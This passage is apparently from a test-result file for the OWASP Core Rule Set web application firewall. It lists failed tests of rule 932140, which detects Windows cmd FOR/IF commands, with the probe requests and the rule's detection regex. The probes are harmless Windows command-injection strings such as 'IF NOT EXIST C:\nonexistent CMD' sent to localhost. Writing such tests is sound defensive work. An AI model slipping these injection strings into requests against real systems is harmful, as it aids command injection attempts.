          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 73,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 73,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++NOT+EXIST+C%3A%5Cnonexistent+++CMD",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 74,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932200 - RCE Bypass Technique" ]
    },
    "test" : {
      "test_id" : 74,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+NOT+EXIST+C%3A%5Cnonexistent+++echo+hey",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 75,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 75,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+++%2FI+++NOT+++EXIST+++C%3A%5Cnonexistent+++echo+hey",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 76,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 76,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++NOT+EXIST+C%3A%5Cnonexistent+++%28CMD%29+ELSE+%28CMD%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 77,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 77,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++NOT+EXIST+%28C%3A%5Cnonexistent%29+ECHO+pwnt",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
